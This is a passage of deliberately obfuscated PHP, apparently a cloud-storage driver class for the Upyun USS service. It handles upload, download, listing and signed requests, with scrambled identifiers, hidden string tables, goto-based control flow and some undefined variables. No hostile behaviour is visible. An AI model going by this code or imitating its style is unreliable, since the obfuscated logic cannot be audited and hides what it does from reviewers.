str_replace($DóÓÈ±¸Ã¹[1103], $DóÓÈ±¸Ã¹[33], strtolower($D‰»ç î‡Ã->getType())); if ($bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[102]) { return array($DóÓÈ±¸Ã¹[29] => $DóÓÈ±¸Ã¹[102], $DóÓÈ±¸Ã¹[1100] => $DóÓÈ±¸Ã¹[33], $DóÓÈ±¸Ã¹[75] => $B®Àáµ¿ø); } goto fÍ×ÖãƒÒ; BŞ®à¢®Í: $DóÓÈ±¸Ã¹ =& $_SERVER[‡’¶øåüç˜]; $B®Àáµ¿ø = $D‰»ç î‡Ã->path; $bàÛ‚¬¤‹ = str_replace($DóÓÈ±¸Ã¹[1103], $DóÓÈ±¸Ã¹[33], strtolower($D‰»ç î‡Ã->getType())); goto fáŠäŸœÛõ; BÎ‰¯áä¤’: } } goto d”«…ôÖÃğ; d“Öí¹¥Üğ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\x2f\57\166\60\56\141\x70\151\56\165\x70\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($EÑê¤‡›ˆ) { parent::__construct(); $this->_init($EÑê¤‡›ˆ); } public function _init($c˜‰‹±¾£¤) { $FšôŸîßŸ =& $_SERVER[‡’¶øåüç˜]; foreach ($c˜‰‹±¾£¤ as $D¹ô–šÌ— => $e˜ÏœÂï¦) { if (isset($this->{$D¹ô–šÌ—})) { $this->{$D¹ô–šÌ—} = $e˜ÏœÂï¦; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FšôŸîßŸ[1247] . LNG($FšôŸîßŸ[1179])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($f²ºîÕÌ®», $EØ¾í²‚¾ = "\107\105\x54") { $Dé„ìò¯î‡ =& $_SERVER[‡’¶øåüç˜]; $b˜Æ†ª’„ = gmdate($Dé„ìò¯î‡[1212]); $Fë®¼Ç°Ê¬ = base64_encode(hash_hmac($Dé„ìò¯î‡[1248], "{$EØ¾í²‚¾}\46{$f²ºîÕÌ®»}\46{$b˜Æ†ª’„}", md5("{$this->userpass}"), !0)); $aäŞŸè‡Ç½ = array("\x41\165\164\x68\157\162\x69\x7a\x61\164\151\x6f\x6e\x3a\x55\x50\131\x55\116\x20{$this->username}\72{$Fë®¼Ç°Ê¬}", "\104\x61\164\145\72{$b˜Æ†ª’„}"); return $aäŞŸè‡Ç½; } public function ussRequest($FÑÃİÆ…çá, $fí‹÷àŠƒ¢ = "\x47\x45\124", $a›Îİ·´ë… = false, $F‡°…Óé£å = false, $a°ÚÈâò‰§ = false) { goto c§àËƒàêÑ; c§àËƒàêÑ: $dšË»Íçí =& $_SERVER[‡’¶øåüç˜]; $FÑÃİÆ…çá = trim($FÑÃİÆ…çá, $dšË»Íçí[8]); $E¹äÔ×½ñÀ = "\57{$this->bucket}\57{$FÑÃİÆ…çá}"; goto aíßáÛŸ–½; aíßáÛŸ–½: $Bß®‰Ğ»ô = $this->ussHeaders($E¹äÔ×½ñÀ, $fí‹÷àŠƒ¢); if ($F‡°…Óé£å) { $Bß®‰Ğ»ô = array_merge($Bß®‰Ğ»ô, $F‡°…Óé£å); } $c†¯Æº²öœ = url_request($this->endpoint . $E¹äÔ×½ñÀ, $fí‹÷àŠƒ¢, $a›Îİ·´ë…, $Bß®‰Ğ»ô, $a°ÚÈâò‰§); goto c¢®»Ø¿Ã; c¢®»Ø¿Ã: if (!$c†¯Æº²öœ) { return array($dšË»Íçí[1040] => !1, $dšË»Íçí[1042] => $dšË»Íçí[1249]); } if (strtolower($fí‹÷àŠƒ¢) == $dšË»Íçí[188] || in_array($c†¯Æº²öœ[$dšË»Íçí[1040]], array($dšË»Íçí[1107], $dšË»Íçí[1250]))) { $a›Îİ·´ë… = $c†¯Æº²öœ[$dšË»Íçí[1251]]; } else { $a›Îİ·´ë… = json_decode($c†¯Æº²öœ[$dšË»Íçí[1042]], !0); if (!$a›Îİ·´ë…) { $a›Îİ·´ë… = $c†¯Æº²öœ[$dšË»Íçí[1042]]; } else { if (!$c†¯Æº²öœ[$dšË»Íçí[695]] && isset($a›Îİ·´ë…[$dšË»Íçí[1252]])) { $a›Îİ·´ë… = $a›Îİ·´ë…[$dšË»Íçí[1252]]; } } } return array($dšË»Íçí[1040] => $c†¯Æº²öœ[$dšË»Íçí[695]], $dšË»Íçí[1042] => $a›Îİ·´ë…); goto f Ë¶†«ºà; f Ë¶†«ºà: } public function mkfile($Dƒ¯Õ¥ì»¢, $D“è‡Í³» = '', $EÙƒğŞİ‹„ = REPEAT_RENAME) { if ($this->setContent($Dƒ¯Õ¥ì»¢, $D“è‡Í³»)) { return $this->getPathOuter($Dƒ¯Õ¥ì»¢); } return !1; } public function mkdir($DÏÑŸñË—Ö, $d×¥Óà†ã‰ = REPEAT_SKIP) { $CãéœñÜöä =& $_SERVER[‡’¶øåüç˜]; $Bë±ˆÂÖ”‡ = trim($DÏÑŸñË—Ö, $CãéœñÜöä[8]); if ($this->_isFolder($Bë±ˆÂÖ”‡)) { return $this->getPathOuter($Bë±ˆÂÖ”‡); } $E‚Ù™œØœµ = array($CãéœñÜöä[1253]); $aŒÚŸ¡ÛåÁ = $this->ussRequest($Bë±ˆÂÖ”‡, $CãéœñÜöä[216], !1, $E‚Ù™œØœµ); return $aŒÚŸ¡ÛåÁ[$CãéœñÜöä[1040]] ? $this->getPathOuter($Bë±ˆÂÖ”‡) : !1; } public function copyFile($CĞ·™ï•¥’, $eö”Êí½) { $cß”ÖÆÅŒÚ =& $_SERVER[‡’¶øåüç˜]; $fòã¦›ÔŠÓ = array($cß”ÖÆÅŒÚ[1254] . "\57{$this->bucket}\x2f{$CĞ·™ï•¥’}", $cß”ÖÆÅŒÚ[1255]); $A»¥™•òô˜ = $this->ussRequest($eö”Êí½, $cß”ÖÆÅŒÚ[218], !1, $fòã¦›ÔŠÓ); return $A»¥™•òô˜[$cß”ÖÆÅŒÚ[1040]] ? !0 : $this->getPathOuter($eö”Êí½); } public function moveFile($Cº¤ËÉÓì½, $e›º±’¥Ïá) { $f”¯…£×é =& $_SERVER[‡’¶øåüç˜]; $eˆÌ¬ÀÔË = array($f”¯…£×é[1256] . "\x2f{$this->bucket}\57{$Cº¤ËÉÓì½}", $f”¯…£×é[1255]); $D’‡ƒÉÙÜ” = $this->ussRequest($e›º±’¥Ïá, $f”¯…£×é[218], !1, $eˆÌ¬ÀÔË); return $D’‡ƒÉÙÜ”[$f”¯…£×é[1040]] ? !0 : $this->getPathOuter($e›º±’¥Ïá); } public function delFile($b³Ğ‰ôùª) { $b®…îºŸÒ‡ =& $_SERVER[‡’¶øåüç˜]; $AÅÒ¡ç°Ó› = $this->ussRequest($b³Ğ‰ôùª, $b®…îºŸÒ‡[1257]); return $AÅÒ¡ç°Ó›[$b®…îºŸÒ‡[1040]] ? !0 : !1; } public function delFolder($D„¼ñÎİ³ó) { $aƒ¾º¹æÔ¤ =& $_SERVER[‡’¶øåüç˜]; $CäöÁÉŠÅÜ = $this->listAll($D„¼ñÎİ³ó); krsort($CäöÁÉŠÅÜ); foreach ($CäöÁÉŠÅÜ as $B÷†¯º­İ) { $this->ussRequest($B÷†¯º­İ[$aƒ¾º¹æÔ¤[75]], $aƒ¾º¹æÔ¤[1257]); } return $this->ussRequest($D„¼ñÎİ³ó, $aƒ¾º¹æÔ¤[1257]); } public function rename($eó¬Ü‘Ó®², $b‹Ó–Òßæ÷) { if ($this->isFile($eó¬Ü‘Ó®²)) { $b‹Ó–Òßæ÷ = get_path_father($eó¬Ü‘Ó®²) . $b‹Ó–Òßæ÷; return $this->moveFile($eó¬Ü‘Ó®², $b‹Ó–Òßæ÷); } return $this->renameObject($eó¬Ü‘Ó®², $b‹Ó–Òßæ÷); } public function fileInfo($DĞÊÛ¸¿À¨, $FŠäË¹Š­ = false, $Eë§†Ç•À = array()) { $B¡Ü¡ê…ˆ¥ =& $_SERVER[‡’¶øåüç˜]; if ($FŠäË¹Š­) { return array($B¡Ü¡ê…ˆ¥[28] => $this->pathThis($DĞÊÛ¸¿À¨), $B¡Ü¡ê…ˆ¥[75] => $this->getPathOuter($B¡Ü¡ê…ˆ¥[8] . $DĞÊÛ¸¿À¨), $B¡Ü¡ê…ˆ¥[29] => $B¡Ü¡ê…ˆ¥[171], $B¡Ü¡ê…ˆ¥[77] => isset($Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[329]]) ? $Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[329]] : 0, $B¡Ü¡ê…ˆ¥[165] => $this->ext($DĞÊÛ¸¿À¨)); } $C¤ÀÑŠºŠ÷ = array($B¡Ü¡ê…ˆ¥[28] => $this->pathThis($DĞÊÛ¸¿À¨), $B¡Ü¡ê…ˆ¥[75] => $this->getPathOuter($B¡Ü¡ê…ˆ¥[8] . $DĞÊÛ¸¿À¨), $B¡Ü¡ê…ˆ¥[29] => $B¡Ü¡ê…ˆ¥[171], $B¡Ü¡ê…ˆ¥[191] => 0, $B¡Ü¡ê…ˆ¥[107] => isset($CŠÀ“ï·Ñ[$B¡Ü¡ê…ˆ¥[1258]]) ? $CŠÀ“ï·Ñ[$B¡Ü¡ê…ˆ¥[1258]] : 0, $B¡Ü¡ê…ˆ¥[77] => isset($Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[329]]) ? $Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[329]] : 0, $B¡Ü¡ê…ˆ¥[165] => $this->ext($DĞÊÛ¸¿À¨), $B¡Ü¡ê…ˆ¥[192] => !0, $B¡Ü¡ê…ˆ¥[193] => !0); if (empty($Eë§†Ç•À)) { $Eë§†Ç•À = $this->objectMeta($DĞÊÛ¸¿À¨); if (!$Eë§†Ç•À) { return $C¤ÀÑŠºŠ÷; } $C¤ÀÑŠºŠ÷[$B¡Ü¡ê…ˆ¥[191]] = $Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[1259]]; $C¤ÀÑŠºŠ÷[$B¡Ü¡ê…ˆ¥[107]] = $Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[1260]]; $C¤ÀÑŠºŠ÷[$B¡Ü¡ê…ˆ¥[77]] = $Eë§†Ç•À[$B¡Ü¡ê…ˆ¥[77]]; } return $C¤ÀÑŠºŠ÷; } public function folderInfo($e©öÃ©ƒÊó, $A“‚Éœ£ì = false) { $aÇÖØ±åÑŠ =& $_SERVER[‡’¶øåüç˜]; if ($A“‚Éœ£ì) { return array($aÇÖØ±åÑŠ[28] => $this->pathThis($e©öÃ©ƒÊó), $aÇÖØ±åÑŠ[75] => $this->getPathOuter($aÇÖØ±åÑŠ[8] . $e©öÃ©ƒÊó), $aÇÖØ±åÑŠ[29] => $aÇÖØ±åÑŠ[76]); } $DÕíÃÚ = array($aÇÖØ±åÑŠ[28] => $this->pathThis($e©öÃ©ƒÊó), $aÇÖØ±åÑŠ[75] => $this->getPathOuter($aÇÖØ±åÑŠ[8] . $e©öÃ©ƒÊó), $aÇÖØ±åÑŠ[29] => $aÇÖØ±åÑŠ[76], $aÇÖØ±åÑŠ[191] => 0, $aÇÖØ±åÑŠ[107] => isset($C‚Ì¦£á[$aÇÖØ±åÑŠ[1258]]) ? $C‚Ì¦£á[$aÇÖØ±åÑŠ[1258]] : 0, $aÇÖØ±åÑŠ[1169] => !0, $aÇÖØ±åÑŠ[1170] => !0); if (empty($a±Ì¶í˜ïĞ)) { $a±Ì¶í˜ïĞ = $this->objectMeta($e©öÃ©ƒÊó); if (!$a±Ì¶í˜ïĞ) { return $DÕíÃÚ; } $DÕíÃÚ[$aÇÖØ±åÑŠ[191]] = $a±Ì¶í˜ïĞ[$aÇÖØ±åÑŠ[1259]]; $DÕíÃÚ[$aÇÖØ±åÑŠ[107]] = $a±Ì¶í˜ïĞ[$aÇÖØ±åÑŠ[1260]]; } return $DÕíÃÚ; } private function fileList($Cãò§ŸÙ¢, $f•Ï÷ëÀÕ = 0, $B•–™Æ½Ü = 1000) { $aÉ˜¨ì‡ªÂ =& $_SERVER[‡’¶øåüç˜]; $A‡Ê•öñ‘ = array($aÉ˜¨ì‡ªÂ[1261], $aÉ˜¨ì‡ªÂ[1262] . $B•–™Æ½Ü); if ($f•Ï÷ëÀÕ) { $A‡Ê•öñ‘[] = $aÉ˜¨ì‡ªÂ[1263] . $f•Ï÷ëÀÕ; } $dÁÈ›ÖËÇ = $this->ussRequest($Cãò§ŸÙ¢, $aÉ˜¨ì‡ªÂ[220], !1, $A‡Ê•öñ‘); return !$dÁÈ›ÖËÇ[$aÉ˜¨ì‡ªÂ[1040]] ? !1 : $dÁÈ›ÖËÇ[$aÉ˜¨ì‡ªÂ[1042]]; } public function listPath($eÀ­Íïƒ, $dºŒ”“ÎÜ = false) { goto däˆŒäôŞ»; däˆŒäôŞ»: $d÷Ù©çä´‘ =& $_SERVER[‡’¶øåüç˜]; $DÑñ™¹ÀÚØ = $d÷Ù©çä´‘[33]; $B•æÊ¹õæï = 1000; goto c–÷ÃñØº½; c–÷ÃñØº½: $BÃ‘ÙÓ•ƒ¶ = $DÏãâ‹íİ = array(); $b¸–¢œôª = rtrim($eÀ­Íïƒ, $d÷Ù©çä´‘[8]) . $d÷Ù©çä´‘[8]; while (!0) { $B Á‹»‡¦ = $this->fileList($eÀ­Íïƒ, $DÑñ™¹ÀÚØ, $B•æÊ¹õæï); if (!$B Á‹»‡¦) { return !1; } $DÑñ™¹ÀÚØ = isset($B Á‹»‡¦[$d÷Ù©çä´‘[1264]]) ? $B Á‹»‡¦[$d÷Ù©çä´‘[1264]] : $d÷Ù©çä´‘[33]; $aî—Õ“º½  = isset($B Á‹»‡¦[$d÷Ù©çä´‘[1265]]) ? $B Á‹»‡¦[$d÷Ù©çä´‘[1265]] : array(); foreach ($aî—Õ“º½  as $DÆ¨çƒÁã) { if ($DÆ¨çƒÁã[$d÷Ù©çä´‘[29]] == $d÷Ù©çä´‘[76]) { $BÃ‘ÙÓ•ƒ¶[] = $this->folderInfo($b¸–¢œôª . $DÆ¨çƒÁã[$d÷Ù©çä´‘[28]], $dºŒ”“ÎÜ, $DÆ¨çƒÁã); } else { $DÏãâ‹íİ[] = $this->fileInfo($b¸–¢œôª . $DÆ¨çƒÁã[$d÷Ù©çä´‘[28]], $dºŒ”“ÎÜ, $DÆ¨çƒÁã); } } if (count($aî—Õ“º½ ) < $B•æÊ¹õæï) { break; } } goto F‹……êÌÉ¿; F‹……êÌÉ¿: return array($d÷Ù©çä´‘[74] => $BÃ‘ÙÓ•ƒ¶, $d÷Ù©çä´‘[73] => $DÏãâ‹íİ); goto F“ÜÙ÷õ¯; F“ÜÙ÷õ¯: } private function recursionAllFiles($Dª¯Â‰–¾š, &$fÊÁˆÂùÂ) { $B‚æóœÍì =& $_SERVER[‡’¶øåüç˜]; $a¦œŠÌğ¸ = $B‚æóœÍì[33]; $f§„Æ¦ä Œ = 1000; $EÃªÁ¢İŸ­ = $Aëç¶¨ó† = array(); $C¾éåê¦³Ã = rtrim($Dª¯Â‰–¾š, $B‚æóœÍì[8]) . $B‚æóœÍì[8]; while (!0) { $b±„òòã£Ä = $this->fileList($Dª¯Â‰–¾š, $a¦œŠÌğ¸, $f§„Æ¦ä Œ); if (!$b±„òòã£Ä) { return !1; } $a¦œŠÌğ¸ = isset($b±„òòã£Ä[$B‚æóœÍì[1264]]) ? $b±„òòã£Ä[$B‚æóœÍì[1264]] : $B‚æóœÍì[33]; $Bçœí…‡Ë‹ = isset($b±„òòã£Ä[$B‚æóœÍì[1265]]) ? $b±„òòã£Ä[$B‚æóœÍì[1265]] : array(); foreach ($Bçœí…‡Ë‹ as $bîˆÅº¥‰) { $bÔÊèæ¸š = array($B‚æóœÍì[75] => $C¾éåê¦³Ã . $bîˆÅº¥‰[$B‚æóœÍì[28]], $B‚æóœÍì[76] => $bîˆÅº¥‰[$B‚æóœÍì[29]] == $B‚æóœÍì[76] ? 1 : 0, $B‚æóœÍì[77] => isset($bîˆÅº¥‰[$B‚æóœÍì[329]]) ? $bîˆÅº¥‰[$B‚æóœÍì[329]] : 0); $fÊÁˆÂùÂ[] = $bÔÊèæ¸š; if ($bÔÊèæ¸š[$B‚æóœÍì[76]] == 1) { $this->recursionAllFiles($bÔÊèæ¸š[$B‚æóœÍì[75]], $fÊÁˆÂùÂ); } } if (count($Bçœí…‡Ë‹) < $f§„Æ¦ä Œ) { break; } } } public function has($bäö‡ÔÈ¿, $bçŒ®›ğ°– = false, $DÚÁÁªå‹¸ = true) { goto fÎÅ¦ƒÔÜİ; fÎÅ¦ƒÔÜİ: $D²ÈÊÎ†¶ =& $_SERVER[‡’¶øåüç˜]; $c¼”ß’ŸÊ = $D²ÈÊÎ†¶[33]; $a™®ë¥ÆÂ = 1000; goto CÊ¥ó˜ÖŒÂ; A‹Àê˜Ü‹™: while (!0) { $aƒÃ’Û±ğ = $this->fileList($bäö‡ÔÈ¿, $c¼”ß’ŸÊ, $a™®ë¥ÆÂ); if (!$aƒÃ’Û±ğ) { return !1; } $c¼”ß’ŸÊ = isset($aƒÃ’Û±ğ[$D²ÈÊÎ†¶[1264]]) ? $aƒÃ’Û±ğ[$D²ÈÊÎ†¶[1264]] : $D²ÈÊÎ†¶[33]; $DÑßÕËÏ‚Î = isset($aƒÃ’Û±ğ[$D²ÈÊÎ†¶[1265]]) ? $aƒÃ’Û±ğ[$D²ÈÊÎ†¶[1265]] : array(); if (empty($DÑßÕËÏ‚Î)) { break; } $aŞóø±åº = array_to_keyvalue($DÑßÕËÏ‚Î, $D²ÈÊÎ†¶[33], $D²ÈÊÎ†¶[29]); $B¥ñ‚£Æ­ = array_count_values($aŞóø±åº); $Dªæ‰âºŞ = isset($B¥ñ‚£Æ­[$D²ÈÊÎ†¶[76]]) ? $B¥ñ‚£Æ­[$D²ÈÊÎ†¶[76]] : 0; $aÒ¨ğÀˆ—¯ = count($aŞóø±åº) - $Dªæ‰âºŞ; if ($bçŒ®›ğ°–) { $D®™îÅÔ³— += $Dªæ‰âºŞ; $EÑ¾¹•Ì÷² += $aÒ¨ğÀˆ—¯; if ($A·ò¡›„õ < $a™®ë¥ÆÂ) { break; } continue; } if ($DÚÁÁªå‹¸) { if ($aÒ¨ğÀˆ—¯) { return !0; } } else { if ($Dªæ‰âºŞ) { return !0; } } if (count($DÑßÕËÏ‚Î) < $a™®ë¥ÆÂ) { break; } } if ($bçŒ®›ğ°–) { return array($D²ÈÊÎ†¶[195] => $EÑ¾¹•Ì÷², $D²ÈÊÎ†¶[196] => $D®™îÅÔ³—); } return !1; goto aá¿³–íåŠ; CÊ¥ó˜ÖŒÂ: $EÑ¾¹•Ì÷² = 0; $D®™îÅÔ³— = 0; $d®óÆÓöÂ© = rtrim($bäö‡ÔÈ¿, $D²ÈÊÎ†¶[8]) . $D²ÈÊÎ†¶[8]; goto A‹Àê˜Ü‹™; aá¿³–íåŠ: } public function listAll($bÏÜò÷‚ã¸) { $cÑÔ¿Ú¿ê© = array(); $this->recursionAllFiles($bÏÜò÷‚ã¸, $cÑÔ¿Ú¿ê©); return $cÑÔ¿Ú¿ê©; } public function canRead($DÕéØ£Í´ò) { return $this->exist($DÕéØ£Í´ò) ? !0 : !1; } public function canWrite($b‚è®Šğ¹) { return $this->exist($b‚è®Šğ¹) ? !0 : !1; } public function getContent($eµğ¾‚Ø) { return $this->fileSubstr($eµğ¾‚Ø, 0, -1); } public function setContent($d¶¸À³´¨, $B‹¦ö¦Ò— = '') { $D‰æùˆ‚Ë‘ =& $_SERVER[‡’¶øåüç˜]; if (!$B‹¦ö¦Ò—) { $fõÀ±œ­é = $this->ussRequest($d¶¸À³´¨, $D‰æùˆ‚Ë‘[216]); return $fõÀ±œ­é[$D‰æùˆ‚Ë‘[1040]]; } $B¾›ÛÄÒ’· = $this->tempFile($this->pathThis($d¶¸À³´¨)); file_put_contents($B¾›ÛÄÒ’·, $B‹¦ö¦Ò—); if ($this->upload($d¶¸À³´¨, $B¾›ÛÄÒ’·)) { $this->tempFileRemve($B¾›ÛÄÒ’·); return !0; } return !1; } public function fileSubstr($b‘ŸŠËé©Ü, $AÍŠˆĞ‹½ö, $eÃ¦ÑŒŠâÓ) { $fŠÀÔÏ»õ =& $_SERVER[‡’¶øåüç˜]; if (!($Cßªå‘Í—‹ = $this->link($b‘ŸŠËé©Ü))) { return !1; } $aîÛêß·Ñõ = !1; if ($eÃ¦ÑŒŠâÓ > 0) { $Aäáœô¯‘ = $AÍŠˆĞ‹½ö + $eÃ¦ÑŒŠâÓ - 1; $aîÛêß·Ñõ = array($fŠÀÔÏ»õ[1226] . $AÍŠˆĞ‹½ö . $fŠÀÔÏ»õ[424] . $Aäáœô¯‘); } $aÌôˆéƒóß = url_request($Cßªå‘Í—‹, $fŠÀÔÏ»õ[220], !1, $aîÛêß·Ñõ); return $aÌôˆéƒóß[$fŠÀÔÏ»õ[695]] ? $aÌôˆéƒóß[$fŠÀÔÏ»õ[1042]] : !1; } public function upload($d¸ˆä¡Ï­Ş, $a¥‘«´”÷…, $c…Îùª¿¤î = false, $CÕÁœŠÈ±ˆ = REPEAT_REPLACE) { goto d§ÕÄÉò—; Cßù³šßØ: do { $fŒââ–³‹  = $BëŒ¡®ÛÜÌ[$a„²ğÄù£é[1272]]; fseek_64($B‹½ÍçĞ”‹, $cË™êˆö™¤); $b‰Ú‹¿À‚ = fread($B‹½ÍçĞ”‹, $fŒââ–³‹ ); $aŠÂßô´£ = 0; do { $aŠÂßô´£++; $BëŒ¡®ÛÜÌ = $this->uploadPart($d¸ˆä¡Ï­Ş, $BëŒ¡®ÛÜÌ, $b‰Ú‹¿À‚); } while (!$BëŒ¡®ÛÜÌ && $aŠÂßô´£ < 3); if (!$BëŒ¡®ÛÜÌ) { return !1; } $BÉöùÔåÌ¯ = $BëŒ¡®ÛÜÌ[$a„²ğÄù£é[1271]]; $cË™êˆö™¤ += $fŒââ–³‹ ; } while ($BÉöùÔåÌ¯ != -1); fclose($B‹½ÍçĞ”‹); $Dê‰‰Û–¨ = array($a„²ğÄù£é[1273], $a„²ğÄù£é[1274] . $BëŒ¡®ÛÜÌ[$a„²ğÄù£é[1275]], $a„²ğÄù£é[1269]); goto Cæ÷†ù¢ß£; dƒ§Ä¨™ÛÌ: $Fçä¹îÜò = 1024 * 1024 * 10; $Dê‰‰Û–¨ = array($a„²ğÄù£é[1267], $a„²ğÄù£é[1268] . $FÒ½Šêµ‰“, $a„²ğÄù£é[1269], $a„²ğÄù£é[1270] . $Fçä¹îÜò); $eŒìğñÄ«é = $this->ussRequest($d¸ˆä¡Ï­Ş, $a„²ğÄù£é[218], !1, $Dê‰‰Û–¨); goto b³²†èµ¾; d£¦Ì– İÀ: $BÉöùÔåÌ¯ = $BëŒ¡®ÛÜÌ[$a„²ğÄù£é[1271]]; $B‹½ÍçĞ”‹ = fopen($a¥‘«´”÷…, $a„²ğÄù£é[1176]); if (!$B‹½ÍçĞ”‹) { return !1; } goto Cßù³šßØ; b³²†èµ¾: if (!$eŒìğñÄ«é[$a„²ğÄù£é[1040]]) { return !1; } $BëŒ¡®ÛÜÌ = $eŒìğñÄ«é[$a„²ğÄù£é[1042]]; $cË™êˆö™¤ = 0; goto d£¦Ì– İÀ; Cæ÷†ù¢ß£: $eŒìğñÄ«é = $this->ussRequest($d¸ˆä¡Ï­Ş, $a„²ğÄù£é[218], !1, $Dê‰‰Û–¨); return $eŒìğñÄ«é[$a„²ğÄù£é[1040]] ? $this->getPathOuter($aÑ³ğ•¥‚) : !1; goto AÜåˆÁáƒ§; d§ÕÄÉò—: $a„²ğÄù£é =& $_SERVER[‡’¶øåüç˜]; $FÒ½Šêµ‰“ = IO::size($a¥‘«´”÷…); if ($FÒ½Šêµ‰“ <= 1024 * 1024 * 200) { $C «¼İ†¼Ò = array($a„²ğÄù£é[1266] . $a¥‘«´”÷…); $eŒìğñÄ«é = $this->ussRequest($d¸ˆä¡Ï­Ş, $a„²ğÄù£é[218], $C «¼İ†¼Ò); return $eŒìğñÄ«é[$a„²ğÄù£é[1040]] ? $this->getPathOuter($d¸ˆä¡Ï­Ş) : !1; } goto dƒ§Ä¨™ÛÌ; AÜåˆÁáƒ§: } private function uploadPart($A‡¯Ğ‡»Ë, $EĞàÂ¾Ìƒ, &$FÍ™è°Ø÷‹) { $A¼ŠÇ‚ÛÇ =& $_SERVER[‡’¶øåüç˜]; $A²ÅªâÉÕ = array($A¼ŠÇ‚ÛÇ[1276], $A¼ŠÇ‚ÛÇ[1274] . $EĞàÂ¾Ìƒ[$A¼ŠÇ‚ÛÇ[1275]], $A¼ŠÇ‚ÛÇ[1277] . $EĞàÂ¾Ìƒ[$A¼ŠÇ‚ÛÇ[1271]], $A¼ŠÇ‚ÛÇ[138] . $EĞàÂ¾Ìƒ[$A¼ŠÇ‚ÛÇ[1272]]); $fñÅÊ‚ˆ = $this->ussRequest($A‡¯Ğ‡»Ë, $A¼ŠÇ‚ÛÇ[218], $FÍ™è°Ø÷‹, $A²ÅªâÉÕ); return !$fñÅÊ‚ˆ[$A¼ŠÇ‚ÛÇ[1040]] ? $fñÅÊ‚ˆ[$A¼ŠÇ‚ÛÇ[1040]] : $fñÅÊ‚ˆ[$A¼ŠÇ‚ÛÇ[1042]]; } public function uploadFormData($aßø†³†‚, $D³äöæÄÑõ = 3600) { return $this->uploadPolicy($aßø†³†‚, $D³äöæÄÑõ); } public function multiUploadFormData($B­ŠÍºº¡ƒ, $d¬‰ÆÒÈÊ = 3600) { $DòÍºù‰‘ö =& $_SERVER[‡’¶øåüç˜]; $B‚åó¾‡ = (int) $GLOBALS[$DòÍºù‰‘ö[7]][$DòÍºù‰‘ö[77]]; return $this->uploadPolicy($B­ŠÍºº¡ƒ, $d¬‰ÆÒÈÊ, $B‚åó¾‡); } private function uploadPolicy($D»á¬ñª†á, $aË†œ›ÕÒ² = 3600, $c‚ƒŒ¿ôŒ¤ = 0) { goto a½Í÷Ù„‰‹; f…™÷ÍÔíñ: $AÒíÑà¼­ = array($c±‘§Ö¾ŒÔ[1278] => $this->bucket, $c±‘§Ö¾ŒÔ[1279] => $D»á¬ñª†á, $c±‘§Ö¾ŒÔ[1280] => time() + $aË†œ›ÕÒ², $c±‘§Ö¾ŒÔ[1281] => $dó‘¢ßõ£Û); if ($c‚ƒŒ¿ôŒ¤) { $AÒíÑà¼­[$c±‘§Ö¾ŒÔ[1198]] = $c‚ƒŒ¿ôŒ¤; } $eŒ¯™ƒÖ = base64_encode(json_encode($AÒíÑà¼­)); goto F®’·”ˆ; F®’·”ˆ: $AğŞÏ¦ÏŒ¥ = base64_encode(hash_hmac($c±‘§Ö¾ŒÔ[1248], "\120\117\123\124\46{$b¿–ÍÖ“¨}\46{$dó‘¢ßõ£Û}\46{$eŒ¯™ƒÖ}", md5("{$this->userpass}"), !0)); $B÷²¶ÉØØ = array($c±‘§Ö¾ŒÔ[1119] => $eŒ¯™ƒÖ, $c±‘§Ö¾ŒÔ[1282] => "\x55\x50\131\x55\x4e\40{$this->username}\72{$AğŞÏ¦ÏŒ¥}", $c±‘§Ö¾ŒÔ[173] => $this->endpoint . $b¿–ÍÖ“¨); return $B÷²¶ÉØØ; goto BÆœÕ‰øŒ; a½Í÷Ù„‰‹: $c±‘§Ö¾ŒÔ =& $_SERVER[‡’¶øåüç˜]; $b¿–ÍÖ“¨ = $c±‘§Ö¾ŒÔ[8] . $this->bucket; $dó‘¢ßõ£Û = gmdate($c±‘§Ö¾ŒÔ[1212]); goto f…™÷ÍÔíñ; BÆœÕ‰øŒ: } public function download($EÔŞìƒÎá, $aÄæ•Í«ç) { goto D¸áğ¤ù; D¥êÊÄ÷©ï: fclose($eŒ¯ìãÕ•›); return $aÄæ•Í«ç; goto fé­–¸ß¡°; fˆÛ£ğÎ†: $eõ‚‚ŠØõ¶ = 1024 * 200; $eŒ¯ìãÕ•› = fopen($eŒÒ‘ÀÎÏŸ, $_SERVER[‡’¶øåüç˜][1232]); while (!0) { $FĞª•’è  = $this->fileSubstr($EÔŞìƒÎá, $b˜àÀêÄŠ, $eõ‚‚ŠØõ¶); if ($FĞª•’è  === !1) { return !1; } fwrite($eŒ¯ìãÕ•›, $FĞª•’è ); $b˜àÀêÄŠ += $eõ‚‚ŠØõ¶; if (strlen($FĞª•’è ) < $eõ‚‚ŠØõ¶) { break; } } goto D¥êÊÄ÷©ï; D¸áğ¤ù: $eŒÒ‘ÀÎÏŸ = IO::getPathInner(IO::mkfile($aÄæ•Í«ç)); if (!($Bå†²À¡‚õ = $this->link($EÔŞìƒÎá))) { return !1; } $b˜àÀêÄŠ = 0; goto fˆÛ£ğÎ†; fé­–¸ß¡°: } public function link($bèÁ•Äó¤, $B¢ÈŒö²µ½ = array()) { $a”×Œ‹‹‘‹ =& $_SERVER[‡’¶øåüç˜]; $bèÁ•Äó¤ = trim($bèÁ•Äó¤, $a”×Œ‹‹‘‹[8]); if (!empty($this->token)) { $EßÎáÄæˆŞ = strtotime(date($a”×Œ‹‹‘‹[1283])); $D¢µÙš¶‘ = substr(md5($this->token . $a”×Œ‹‹‘‹[276] . $EßÎáÄæˆŞ . $a”×Œ‹‹‘‹[1284] . $bèÁ•Äó¤), 12, 8) . $EßÎáÄæˆŞ; $B¢ÈŒö²µ½[] = $a”×Œ‹‹‘‹[1285] . $D¢µÙš¶‘; } $BÛ†Àº±×Ø = !empty($B¢ÈŒö²µ½) ? $a”×Œ‹‹‘‹[69] . implode($a”×Œ‹‹‘‹[276], $B¢ÈŒö²µ½) : $a”×Œ‹‹‘‹[33]; return 